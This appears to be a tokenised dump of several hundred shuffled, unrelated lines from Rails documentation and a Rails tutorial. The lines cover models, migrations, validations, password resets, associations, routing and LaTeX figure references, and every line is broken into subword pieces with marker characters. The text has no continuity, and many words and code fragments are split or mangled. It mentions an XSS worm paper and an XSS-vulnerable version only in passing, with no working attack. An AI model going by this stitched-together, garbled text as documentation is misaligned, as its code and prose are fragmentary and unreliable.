▁You ▁can ▁use ▁the ▁` includes ` ▁method ▁to ▁specify ▁second - order ▁associations ▁that ▁should ▁be ▁ eager - load ed ▁when ▁this ▁association ▁is ▁used ▖
▁* ▁The ▁routing ▁parameters ▁for ▁the ▁route
▁in ▁the ▁feature ▁file ▁are ▁handle d ▁by ▁these ▁steps :
▁This ▁is ▁because ▁the ▁code
▁We ▁saw ▁in ▁Figure ~\ ref { fig : new _ signup _ page } ▁( show n ▁again ▁in ▁Figure ~\ ref { fig : blank _ signup _ page _ re c a p }) ▁that ▁the ▁signup ▁page ▁is ▁current ly ▁blank : ▁use less ▁for ▁ signing ▁up ▁new ▁users .
▁The ▁syntax ▁is ▁simple , ▁rely ing ▁on ▁Ruby ▁blocks ▁and ▁custom ▁methods ▁to ▁define ▁the ▁attributes ▁of ▁the ▁desired ▁object .
▁The ▁changes ▁we ' ll ▁test ▁for ▁are ▁the ▁rendering ▁of ▁the ▁user ' s ▁profile ▁page ▁( as ▁determine d ▁by ▁the ▁page ▁title , ▁which ▁should ▁be ▁the ▁user ' s ▁name ), ▁together ▁with ▁three ▁plan n ed ▁changes ▁to ▁the ▁site ▁navigation :
▁Find ▁more ▁details ▁on ▁[ R o s ar io ▁ V al o tt a ' s ▁ paper ]( http :// www ▖ x s s ed ▖ com / new s / 37 / N d u ja _ Connection _ A _ cross _ web mail _ w or m _ X W W / )▖
▁In ▁addition ▁to ▁the ▁model , ▁Rails ▁has ▁also ▁made ▁a ▁migration ▁to ▁create ▁the ╼ c or respond ing ▁database ▁table :
▁class ▁B
▁The ▁method ▁here ▁is ▁to ▁make ▁a ▁user ▁with ▁the ▁same ▁email ▁address ▁as ▁\ k ode {@ user }, ▁which ▁we ▁accomplish ▁using ▁\ k ode {@ user ▖ dup }, ▁which ▁creates ▁a ▁duplicate ▁user ▁with ▁the ▁same ▁attributes ▖ ▁S ince ▁we ▁then ▁save ▁that ▁user , ▁the ▁original ▁\ k ode {@ user } ▁has ▁an ▁email ▁address ▁that ▁already ▁exists ▁in ▁the ▁database , ▁and ▁hence ▁should ▁not ▁be ▁valid .
▁If ▁you ▁now ▁go ▁to ▁< http :// localhost :3000/ articles / new > ▁you ' ll ▁* al most * ▁be ▁able ╼ to ▁create ▁an ▁article ▖
▁What ▁the ▁` create ` ▁action ▁should ╼ be ▁doing ▁is ▁saving ▁our ▁new ▁article ▁to ▁the ▁database .
▁validates ▁: token , ▁presence : ▁true , ▁uniqueness : ▁true , ▁ strict : ▁ Token Generation E xception
▁In ▁case ▁of ▁co ll is ion ▁the ▁key ▁in ▁the ▁hash ▁of ▁the ▁argument ▁ w in s ▁in ▁` merge ` ▖
▁This ▁code ▁is ▁responsib le ▁for ▁insert ing ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁layout .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action }
▁In ▁this ▁mode ▁all ╼ request s ▁for ▁assets ▁in ▁the ▁pipeline ▁are ▁handle d ▁by ▁Sprockets ▁directly .
▁In ▁addition , ▁the ▁destroyed ▁object ▁ still ▁exists ▁in ▁memory :
▁If ▁you ▁refresh ▁< http :// localhost :3000/ articles / new > ▁now , ▁you ' ll ▁get ▁a ▁new ▁error :
▁ Custom ▁session ▁store s ▁can ▁also ▁be ▁specified :
▁To ▁get ▁started ▁with ▁the ▁Ruby ▁installation , ▁first ▁\ href { http :// rvm ▖ io / rvm / install /}{ install ▁ RVM } :
▁<%= ▁javascript _ include _ tag ▁" application ", ▁" data - turbolinks - track " ▁=> ▁true ▁%>
▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut } .
▁This ▁method ▁determine s ▁if ▁a ▁given ▁password ▁is ▁valid ▁for ▁a ▁particular ▁user ▁by ▁ com put ing ▁its ▁digest ▁and ▁compar ing ▁the ▁result ▁to ▁\ k ode { password \_ digest } ▁in ▁the ▁database .
▁ isolate _ namespace ▁Blorgh
▁Active ▁Support ▁provides ▁a ▁better ▁implementation ▁of ▁` to _ json ` ▁than ▁the ▁` json ` ▁gem ▁or dinarily ▁provides ▁for ▁Ruby ▁objects ▖
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { admin } ▁boolean ▁attribute .
▁Un do ing ▁things
▁Client ▖ find _ or _ create _ by ( first _ name : ▁' Andy ') ▁do ▁| c |
▁#### ▁ Options ▁for ▁` has _ many `
▁You ▁ probably ▁don ' t ▁want ▁to ▁just ▁ s it ▁there ▁with ▁a ▁ filled ▁out ▁`< form >` , ▁though ▖╼
▁If ▁you ▁ reload ╼ < http :// localhost :3000/ articles / new > ▁and ╼ try ▁to ▁save ▁an ▁article ▁without ▁a ▁title , ▁Rails ▁will ▁send ▁you ▁back ▁to ▁the ╼ form , ▁but ▁that ' s ▁not ▁very ▁useful ▖
▁You ▁will ▁also ▁be ▁ready ▁to ▁benefit ▁from ▁the ▁many ▁more ▁advanced ▁ books , ▁blog s , ▁and ▁ screencasts ▁that ▁are ▁part ▁of ▁the ▁ th ri v ing ▁Rails ▁ ed u c ation al ▁e co system .
▁Verify ▁that ▁it ▁is ▁correctly ▁installed ▁and ▁in ▁your ▁ PATH :
▁Git ▁remote ▁ heroku ▁added
▁Compute s ▁the ▁path ▁to ▁a ▁JavaScript ▁asset ▁in ▁the ▁` app / assets / javascripts ` ▁directory ▖
▁On ce ▁it ' s ▁been ▁installed , ▁you ▁can ▁simply ▁ drop ▁a ▁reference ▁to ▁the ▁console ▁helper ▁( i ▖ e ▖ , ▁` <%= ▁console ▁%> ` ) ▁into ▁any ▁view ▁you ▁want ▁to ▁enable ▁it ▁for ▖
▁There ▁are ▁many ▁options ▁for ▁\ href { http :// l m gt fy ▖ com / ? q = rails + en force + password + strength } { en for c ing ▁password ▁ strength ▁in ▁Rails }, ▁but ▁for ▁simplicity ▁we ' ll ▁just ▁enforce ▁a ▁ minimum ▁length ▁and ▁the ▁requirement ▁that ▁the ▁password ▁not ▁be ▁blank .
▁T O D O ▖ ▖ .
▁COM ▁ THE _ U S - ER @ foo ▖ bar ▖ org ▁first ▖ last @ foo ▖ jp ]
▁As ▁an ▁ additional ▁security ▁pre c a u tion , ▁we ' ll ▁also ▁plan ▁to ▁\ emph { expire } ▁the ▁reset ▁link ▁after ▁a ▁couple ▁of ▁hours , ▁which ▁requires ▁record ing ▁the ▁time ▁when ▁the ▁reset ▁get s ▁sent .
▁A ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox ▖
▁<%= ▁link _ to ▁" New ▁book ", ▁new _ book _ path ▁%>
▁General ly ▁we ▁want ▁our ▁Rails ▁server ╼ to ▁tell ▁our ▁CDN ▁( and ▁browser ) ▁that ▁the ▁asset ▁is ▁" public ", ▁that ▁means ▁any ▁cache ╼ can ▁store ▁the ▁request ▖
▁This ▁can ▁be ▁overrid d en ▁on ▁a ▁per - email ▁basis .
▁### ▁Co mb in ing ▁Validation ▁Conditions
▁email = michael %40 michael hartl ▖ com "> Re set ▁password </ a >╼╼< p > This ▁link ▁will ▁ expire ▁in ▁two ▁hours ▖ </ p >╼╼< p >╼ If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and ╼ your ▁password ▁will ▁ st a y ▁as ▁it ▁is .
▁Listing ~\ ref { code : followers _ test } ▁add s ▁only ▁one ▁line ▁to ▁the ▁test ▁from ▁Listing ~\ ref { code : utility _ method _ tests }, ▁but ▁so ▁many ▁things ▁have ▁to ▁go ▁right ▁to ▁get ▁it ▁to ▁pass ▁that ▁it ' s ▁a ▁very ▁ sensitive ▁test ▁of ▁the ▁code ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships } .
▁Note ▁that ▁the ▁default ▁error ▁messages ▁are ▁plural ▁( e ▖ g ▖ , ▁" is ▁too ▁short ▁( minimum ╼ is ▁% { count } ▁characters ) ")▖
▁By ▁the ▁way , ▁previous ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁in ▁place ▁of ▁\ text tt { PATCH }, ▁and ▁Rails ~4▖0 ▁ still ▁supports ▁this ▁usage , ▁but ▁\ text tt { PATCH } ▁\ href { http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ match es ▁the ▁intend ed ▁HTTP ▁usage ▁better } ▁and ▁is ▁preferred ▁for ▁new ▁applications .
▁email
▁Rails ▁provides ▁two ▁methods ▁that ▁address ▁this ▁problem ▁by ▁ div id ing ▁records ▁into ▁memory - friendly ▁ batches ▁for ▁process ing ▖
▁This ▁helper ▁validates ▁that ▁the ▁specified ▁attributes ▁are ▁not ▁empty ▖
▁< ul >
▁: video job s
▁Here ▁the ▁first ▁argument ▁is ▁the ▁migration ▁name , ▁and ▁we ' ve ▁also ▁supplied ▁a ▁second ▁argument ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁message : ▁" only ▁allows ▁letter s " ▁ }
▁You ▁can ▁also ▁pass ▁local ▁variables ▁into ▁partials , ▁making ▁them ▁even ▁more ▁powerful ▁and ▁flexible ▖
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } .
▁Person ▖ create ( name : ▁nil )▖ valid ?
▁The ▁` isolate _ namespace ` ▁method ▁here ▁ de serv es ▁special ▁notice ▖
▁Of ▁course , ▁it ' s ▁ never ▁a ▁ bad ▁idea ▁to ▁take ▁a ▁look ▁at ▁the ▁page ▁in ▁a ▁browser ▁to ▁make ▁sure ▁our ▁tests ▁are n ' t ▁completely ▁c ra z y ▁( Figure ~\ ref { fig : about _ us }) .
▁The ▁in correct ▁flash ▁behavior ▁is ▁a ▁minor ▁bug ▁in ▁our ▁application .
▁In ▁previous ▁versions ▁of ▁Rails , ▁using
▁Because ▁security ▁is ▁a ▁to p ▁ priority , ▁ er r ▁on ▁the ▁ side ▁of ▁writing ▁tests ▁of ▁the ▁security ▁model ▁first .
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁{" action " ▁=> ▁" create ", ▁" controller " ▁=> ▁" people ", ▁" person " ▁=> ▁{" first _ name " ▁=> ▁" W i ll ia m ", ▁" last _ name " ▁=> ▁" S m i th "} }
▁( This ▁\ k ode { follow !} \ ▁method ▁should ▁always ▁work , ▁so , ▁as ▁with ▁\ k ode { create !} \ ▁and ▁\ k ode { save !} , ▁we ▁indicate ▁with ▁an ▁excl a m ation ▁point ▁that ▁an ▁exception ▁will ▁be ▁raised ▁on ▁failure ▖)
▁create ▁app / assets / stylesheets / scaffold s ▖ css ▖ scss
▁The ▁time ▁has ▁finally ▁come ▁to ▁add ▁a ▁second ▁such ▁resource : ▁user ▁\ emph { microposts }, ▁which ▁are ▁short ▁messages ▁ associated ▁with ▁a ▁particular ▁user
▁* ▁If ▁` value ` ▁is ▁a ▁call able ▁object ▁it ▁must ▁expect ▁one ▁or ▁two ▁arguments ▖
▁Next , ▁we ▁need ▁to ▁include ▁ CarrierWave ' s ▁\ href { https :// github ▖ com / mini magic k / mini magic k } { MiniMagick } ▁interface ▁for ▁ ImageMagick , ▁together ▁with ▁a ▁ resizing ▁command .
▁In ▁the ▁case ▁of ▁users ▁and ▁microposts , ▁this ▁process ▁is ▁straightforward , ▁since ▁they ▁are ▁natural ly ▁resources ▁in ▁their ▁own ▁right .
▁By ▁focus ing ▁on ▁high - level ▁functionality --- ve ri fy ing ▁that ▁users ▁can ▁sign ▁in , ▁ st a y ▁signed ▁in ▁from ▁page ▁to ▁page , ▁and ▁can ▁sign ▁out --- we ▁test ▁the ▁ core ▁application ▁code ▁without ▁focus ing ▁on ▁less ▁important ▁details .
▁When ▁in ▁do ub t , ▁it ▁is ▁best ▁to ▁consult ▁a ▁Rails ▁team ▁ member ▁before ▁back port ing ▁your ▁changes ▁to ▁avoid ▁was ted ▁effort .
▁To ▁do ▁this , ▁you ' ll ▁need ▁to ▁generate ▁a ▁comment ╼ model , ▁a ▁comment ▁controller ▁and ▁then ▁modify ▁the ▁articles ▁scaffold ▁to ▁display ╼ comments ▁and ▁allow ▁people ▁to ▁create ▁new ▁one s .
▁If ▁you ▁want ▁to ▁define ▁the ▁ singular ▁form ▁of ▁a ▁resource , ▁you ▁should ▁add ▁ additional ▁rules ▁to ▁the ▁` In f le c to r `:
▁ W hether ▁you ▁included ▁the ▁configuration ▁in ▁Listing ~\ ref { code : irbrc }, ▁you ▁can ▁start ▁the ▁console ▁at ▁the ▁command ▁line ▁as ▁follows :
▁Client ▖ unscope d ▖ load
▁Using ▁plain ▁Ruby ▁you ▁can ▁wrap ▁methods ▁with ▁other ▁methods , ▁that ' s ▁called ▁ _ alias ▁ chain ing _ .
▁# ▁If ▁you ▁change ▁this ▁key , ▁all ▁old ▁signed ▁cookies ▁will ▁become ▁invalid !
▁look s ▁like ▁it ▁m ight ▁have ▁to ▁pull ▁all ▁the ▁followed ▁users ▁out ▁of ▁the ▁database ▁to ▁apply ▁the ▁\ k ode { include ?}\ ▁method , ▁but ▁in ▁fact ▁for ▁e f fi ci en c y ▁Rails ▁arrange s ▁for ▁the ▁compar is on ▁to ▁happen ▁directly ▁in ▁the ▁database .
▁A ▁test ▁for ▁presence ▁of ▁the ▁\ k ode { email } ▁attribute .
▁ ▖ gitignore
▁I ▁prefer ▁to ▁use ▁the ▁\ k ode { shared } ▁folder ▁for ▁ utility ▁partials ▁that ▁are ▁useful ▁on ▁multiple ▁views , ▁while ▁ putting ▁partials ▁that ▁are ▁literal ly ▁on ▁every ▁page ▁( as ▁part ▁of ▁the ▁site ▁layout ) ▁in ▁the ▁\ k ode { layouts } ▁directory .
▁M ▖ parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁Object ]
▁( You ▁m ight ▁also ▁consider ▁the ▁\ href { http :// www ▖ code school ▖ com / c our s es / testing - with - rspec } { RSpec ▁course ▁at ▁Code ▁School }, ▁which ▁one ▁reader ▁has ▁ s a id ▁ answer ed ▁a ▁lot ▁of ▁his ▁RSpec ▁ questions ▖)
▁The ╼ second ▁time ▁we ▁run ▁this ▁code , ▁the ▁block ▁will ▁be ▁ignore d .
▁<%= ▁asset _ path (' s m ile ▖ png ') ▁%>
▁Note ▁in ▁the ▁last ▁example ▁that ▁we ' ve ▁defined ▁an ▁\ k ode { attribute } ▁variable ▁equal ▁to ▁the ▁symbol ▁\ k ode { : activation } ▁and ▁used ▁string ▁inter p ol ation ▁to ▁build ▁up ▁the ▁proper ▁argument ▁to ▁\ k ode { send } .
▁password _ field _ tag ▁' pass '
▁On ▁ Linux , ▁the ▁default ▁terminal ▁is ▁fine .
▁Here ▁\ k ode { user ▖ authenticate } ▁returns ▁\ k ode { false } ▁for ▁invalid ▁password .
▁in ▁Listing ~\ ref { code : annotate d _ title _ helper } .
▁" User "▖ foreign _ key ( false ) ▁# ▁=> ▁" user id "
▁### ▁Generat ing ▁a ▁ Comments ▁Resource
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ the _ flash })▖)
▁The ▁ New s ▁views ▁will ▁use ▁the ▁new ▁layout , ▁h id ing ▁the ▁to p ▁ menu ▁and ▁adding ▁a ▁new ▁right ▁ menu ▁inside ▁the ▁" content " ▁ div .
▁\ label { fig : bitbucket _ repository _ page } }╼\ end { figure }╼╼ ╼ ▁\ subsection { B r an ch , ▁edit , ▁commit , ▁merge } ╼ ▁\ label { sec : git _ commands }╼╼
▁Because ▁the ▁material ▁in ▁this ▁chapter ▁is ▁particular ly ▁challenging , ▁before ▁writing ▁any ▁code ▁we ' ll ▁pa use ▁for ▁a ▁moment ▁and ▁take ▁a ▁to ur ▁of ▁the ▁interface .
▁render ▁action : ▁: edit
▁The ▁ idiomatic ally ▁correct ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁Active ▁Record ▁\ emph { associations }, ▁which ▁we ' ll ▁implement ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁but ▁for ▁now ▁we ' ll ▁work ▁with ▁the ▁\ k ode { Micropost } ▁model ▁directly .
▁We ' re ▁now ▁ready ▁to ▁cover ▁the ▁" D " ▁part ▁of ▁ CRUD , ▁ deleting ▁articles ▁from ▁the ╼ database ▖
▁This ▁allows ▁` except ` ▁to ▁ play ▁nice ▁with ▁hashes ▁with ▁ indifferent ▁access ▁for ▁instance :
▁To ▁add ▁the ▁new ▁ webserver , ▁we ▁simply ▁follow ▁the ▁\ href { https :// dev center ▖ heroku ▖ com / articles / rails - Puma } { Heroku ▁ Puma ▁documentation } .
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE ▁or ▁another ▁Unix - like ▁system , ▁you ▁can ▁accomplish ▁this ▁with ▁the ▁\ k ode { curl } ▁ utility ▁as ▁follows
▁Rails ▁determine s ▁the ▁name ▁of ▁the ▁partial ▁to ▁use ▁by ▁look ing ▁at ▁the ▁model ▁name ▁in ▁the ▁collection , ▁` Product ` ▁in ▁this ▁case ▖
▁* ▁` config ▖ active _ support ▖ escape _ html _ ent it ies _ in _ json ` ▁enable s ▁or ▁disable s ▁the ▁es c a p ing ▁of ▁HTML ▁ ent it ies ▁in ▁JSON ▁serializ ation ▖
▁GR O U P ▁BY ▁status
▁( Here ▁we ' ve ▁used ▁the ▁Rails ▁convention ▁of ▁\ k ode { user } ▁instead ▁of ▁\ k ode { user ▖ id } ▁in ▁the ▁ condition ; ▁Rails ▁automatically ▁uses ▁the ~\ k ode { id } .
▁The ▁check ╼ is ▁now ▁done ▁automatically ▁when ▁you ▁` require ▁' rails / test _ help ' `, ▁a lthough ╼ le a v ing ▁this ▁line ▁in ▁your ▁helper ▁is ▁not ▁ha rm ful ▁in ▁any ▁way .
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac ted ▁from ▁ datetime s :
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ mockup _ profile _ name _ bootstrap - full ▖ png }{( full ▁size )}
▁< th > T ext </ th >
▁We ▁will ▁use ▁this ▁more ▁ compact ▁style ▁when ever ▁possible ▁when ▁developing ▁the ▁rest ▁of ▁the ▁sample ▁application .
▁By ▁writing ▁a ▁\ emph { failing } ▁test ▁first ▁and ▁then ▁implement ing ▁the ▁application ▁code ▁to ▁get ▁it ▁to ▁pass , ▁we ▁increase ▁our ▁confidence ▁that ▁the ▁test ▁is ▁actually ▁cover ing ▁the ▁functionality ▁we ▁think ▁it ▁is .
▁* ▁[ re S R C ' s ▁ List ▁of ▁F re e ▁ Programming ▁ Book s ]( http :// re s r c ▖ io / list / 10 / list - of - free - programming - books / # ruby )
▁You ' ll ▁see ▁how ▁to ▁do ▁this ▁later ▁in ▁this ╼ guid e .
▁The ▁question ▁mark ▁syntax ▁is ▁fine , ▁but ▁when ▁we ▁want ▁the ▁\ emph { s a me } ▁variable ▁inserted ▁in ▁more ▁than ▁one ▁place , ▁the ▁second ▁syntax ▁is ▁more ▁convenient .
▁| ▁ Middleware ▁| ▁P urpose ▁|
▁ Most ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password }, ▁which ▁we ' ll ▁include ▁in ▁the ▁User ▁model ▁as ▁follows :
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁\ k ode { has \_ secure \_ password } ▁automatically ▁add s ▁an ▁\ k ode { authenticate } ▁method ▁to ▁the ▁corresponding ▁model ▁objects .
▁If ▁the ▁receiver ▁respond s ▁to ▁` con ve r t _ key `, ▁the ▁method ▁is ▁called ▁on ▁each ▁of ▁the ▁arguments ▖
▁create ▁app / views / microposts
▁### ▁Ruby ▁ Version s
▁# ▁=> ▁ { : a => 0, ▁: b =>1 , ▁: c =>2}
▁As ▁of ▁this ▁writing ▁the ▁only ▁supported ▁non - default ▁format ▁is ▁`: db `:
▁will ▁raise ▁a ▁\ k ode { NoMethodError } ▁exception .
▁* ▁App li es ▁ human ▁ inflect ion ▁rules ▁to ▁the ▁argument .
▁Un like ▁the ▁login ▁functionality , ▁which ▁we ▁use ▁in ▁both ▁Listing ~\ ref { code : log _ in _ success } ▁and ▁Listing ~\ ref { code : login _ upon _ signup }, ▁we ' ll ▁only ▁be ▁logging ▁out ▁in ▁one ▁place , ▁so ▁we ' ll ▁put ▁the ▁relevant ▁code ▁directly ▁in ▁the ▁\ k ode { destroy } ▁action .
▁< target ▁option =" fast " ▁name =" compile " ▁/>
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁give ▁users ▁the ▁ability ▁to ▁sign ▁up ▁for ▁our ▁site ▁and ▁create ▁a ▁user ▁profile ▁page .
▁page ▁to ▁list ▁all ▁microposts
▁Running ▁the ▁Rails ▁server ▁on ▁a ▁local ▁machine .
▁By ▁default , ▁Rails ▁retrieve s ▁all ▁columns .
▁( It ' s ▁actually ▁at ▁ 78 ▁columns , ▁which ▁gives ▁you ▁a ▁little ▁m ar g in ▁for ▁error ▖)
▁Article ▖ many ?
▁To ╼ add ▁this , ▁put ▁this ▁line ▁under ne a th ▁the ▁call ▁to ▁` render ▁@ article ▖ comments ` ▁in ╼` app / views / blorgh / articles / show ▖ html ▖ erb `:
▁These ▁manifest ▁files ▁contain ▁ _ directive s _ ▁- ▁instructions ▁that ▁tell ▁Sprockets ╼ which ▁files ▁to ▁require ▁in ▁order ▁to ▁build ▁a ▁single ▁CSS ▁or ▁JavaScript ▁file ▖
▁The ▁method ▁` Hash ▖ deep _ dup ` ▁duplicate s ▁itself ▁and ▁all ▁keys ▁and ▁values ╼ in side ▁ recursive ly ▁with ▁Active ▁Support ▁method ▁` Object # deep _ dup ` ▖
▁ alert ▁" page ▁has ▁loaded !"
▁A ▁diagram ▁of ▁this ▁inheritance ▁hierarchy ▁appears ▁in ▁Figure ~\ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } .
▁* ▁` config ▖ action _ view ▖ erb _ tr im _ m ode ` ▁gives ▁the ▁tri m ▁mode ▁to ▁be ▁used ▁by ▁ ERB ▖
▁To ▁specify ▁a ▁ dependency ▁that ▁should ▁only ▁be ▁installed ▁as ▁a ▁development ╼ dependency ▁of ▁the ▁application , ▁specify ▁it ▁like ▁this :
▁The ▁corresponding ▁migration ▁m ight ▁look ▁like ▁this :
▁* ▁` updated _ at ` ▁- ▁A utomatically ▁get s ▁set ▁to ▁the ▁current ▁date ▁and ▁time ▁when ever ╼ ▁the ▁record ▁is ▁updated .
▁But ▁this ▁expression ▁doesn ' t ▁ explain ▁the ▁\ text tt { ||= } ▁notation ▁as ▁well , ▁so ▁the ▁above ▁discussion ▁uses ▁the ▁ nearly ▁equivalent ▁\ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} ▖)
▁#### ▁The ▁E as y ▁Way
▁You ▁can ▁specify ▁a ▁full ▁path ▁relative ▁to ▁the ▁document ▁root , ▁or ▁a ▁URL , ▁if ▁you ▁prefer ▖
▁Fin ally , ▁Figure ~\ ref { fig : user _ profile _ microposts } ▁shows ▁the ▁\ emph { second } ▁page ▁of ▁microposts ▁for ▁the ▁first ▁user , ▁along ▁with ▁the ▁pagination ▁links ▁at ▁the ▁bottom ▁of ▁the ▁display .
▁| ▁| ▁4 10 ▁| ▁: g one ▁|
▁Let ' s ╼ as sum e ▁that ▁we ▁have ▁a ▁list ▁of ▁articles ▁that ▁can ▁be ▁delete d ▁with ▁just ▁one ╼ click ▖
▁To ▁retrieve ▁objects ▁from ▁the ▁database , ▁Active ▁Record ▁provides ▁sever al ▁find er ▁methods ▖
▁belongs _ to ▁: comment
▁If ▁you ▁find ▁an
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ no _ microposts _ bootstrap - full ▖ png }{( full ▁size )}
▁Tests ▁for ▁the ▁ Follow / Unfollow ▁button .
▁However , ▁up ▁to ▁the ▁current ▁version ▁ 3▖0 ▖ 4 , ▁it ▁is ▁ still ▁vulnerable ▁to ▁XSS ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ config } .
▁Because ▁we ' ll ▁end ▁up ▁using ▁the ▁same ▁database ▁table ▁for ▁both ▁active ▁and ▁ passive ▁relationships , ▁we ' ll ▁use ▁the ▁generic ▁ term ▁\ emph { relationship } ▁for ▁the ▁table ▁name , ▁with ▁a ▁corresponding ▁Relationship ▁model .
▁It ' s ▁normal ▁for ▁associations ▁to ▁work ▁in ▁two ▁direct ion s , ▁ requiring ▁declaration ▁on ▁two ▁different ▁models :
▁### ▁ Updating ▁the ▁ Schema
▁ Adding ▁a ▁m app ing ▁for ▁the ▁root ▁route .
▁$ ▁git ▁re base ▁master
▁By ▁modify ing ▁the ▁user ▁information ▁and ▁click ing ▁the ▁ Update ▁User ▁button , ▁we ▁arrange ▁to ▁change ▁the ▁information ▁for ▁the ▁user ▁in ▁the ▁toy ▁application ▁( Figure ~\ ref { fig : demo _ update _ user _ rails _3} ) .
▁#### ▁select _ datetime
▁Action ▁Mailer ▁now ▁just ▁inherit s ▁from ▁` Abstract Controller `, ▁so ▁you ▁have ▁access ▁to ╼ the ▁same ▁generic ▁helpers ▁as ▁you ▁do ▁in ▁Action ▁Controller .
▁</ script >
▁Whi le ▁Rails ▁uses ▁in te ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ many ` ▁association ▁reference ▖
▁invoke ▁test _ unit
▁ Follow er ▁ notification s
▁The ▁user ▁show ▁page ▁with ▁a ▁custom ▁Gravatar ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ custom _ gravatar _ bootstrap _4_0 - full ▖ png }{( full ▁size )}
▁change
▁#### ▁content _ for
▁This ▁is ▁equivalent ▁to ▁the ▁literal ▁construct or , ▁but ▁it ' s ▁more ▁explicit ▁about ▁what ▁we ' re ▁doing .
▁in ▁Listing ~\ ref { code : will _ paginate _ test } .
▁At ▁the ▁end ▁of ▁the ▁signup ▁process , ▁it ' s ▁important ▁to ▁render ▁a ▁profile ▁page ▁with ▁the ▁new ly ▁created ▁user ' s ▁information , ▁so ▁we ' ll ▁ begin ▁by ▁making ▁a ▁page ▁for ▁\ emph { showing } ▁users , ▁which ▁will ▁serve ▁as ▁the ▁first ▁step ▁toward ▁implement ing ▁the ▁REST ▁architecture ▁for ▁users ▁( Section ~\ ref { sec : mvc _ in _ action }) .
▁First , ▁before ▁adding ▁any ▁feature ▁to ▁a ▁Rails ▁application , ▁take ▁a ▁look ▁at ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts ▁ archive } ▁to ▁see ▁if ▁ Ryan ▁Bates ▁has ▁already ▁covered ▁the ▁subject
▁The ▁final ▁\ k ode { correct \_ user } ▁before ▁filter ▖
▁Ou r ▁plan ▁is ▁to ▁edit ▁the ▁Home , ▁Help , ▁and ▁About ▁pages ▁to ▁make ▁page ▁title s ▁that ▁change ▁on ▁each ▁page .
▁test : mysql
▁` underscore ` ▁accept s ▁no ▁argument ▁though .
▁This ╼ file ▁requires ▁the ▁` blorgh / engine ▖ rb ` ▁file ▁( lo cat ed ▁at ▁` lib / blorgh / engine ▖ rb ` )╼ and ▁defines ▁a ▁base ▁module ▁called ▁` Blorgh ` .
▁All ▁of ▁the ▁association ▁methods ▁are ▁built ▁around ▁ caching , ▁which ▁keep s ▁the ▁result ▁of ▁the ▁most ▁ recent ▁query ▁available ▁for ▁further ▁operations ▖
▁For ▁JavaScript ,╼ more ▁complex ▁process es ▁can ▁be ▁applied ▖
▁def ▁ welcome _ email ( user , ▁ com p any )
▁### ▁` uniqueness `
▁* ▁How ▁to ▁specify ▁the ▁order , ▁retrieved ▁attributes , ▁group ing , ▁and ▁other ▁ properties ▁of ▁the ▁found ▁records .
▁It ▁will ▁first ▁require ▁` lib / blorgh ▖ rb ` ▁from ▁the ▁engine , ▁then ╼` lib / blorgh / engine ▖ rb `, ▁which ▁is ▁the ▁file ▁that ▁defines ▁the ▁major ▁pieces ▁of ╼ function al ity ▁for ▁the ▁engine .
▁P ref er ▁word ing s ▁that ▁avoid ▁" you " s ▁and ▁" your " s ▖
▁( Here ▁\ k ode { Picture Upload er } ▁is ▁defined ▁in ▁the ▁file ▁\ k ode { picture \_ uploader ▖ rb }, ▁\ line break ▁which ▁we ' ll ▁start ▁edit ing ▁in ▁Section ~\ ref { sec : image _ validation }, ▁but ▁for ▁now ▁the ▁generated ▁default ▁is ▁fine ▖)
▁With ▁the ▁code ▁as ▁above , ▁following ▁the ▁link ▁from ▁Listing ~\ ref { code : password _ reset _ email } ▁should ▁render ▁a ▁password ▁reset ▁form .
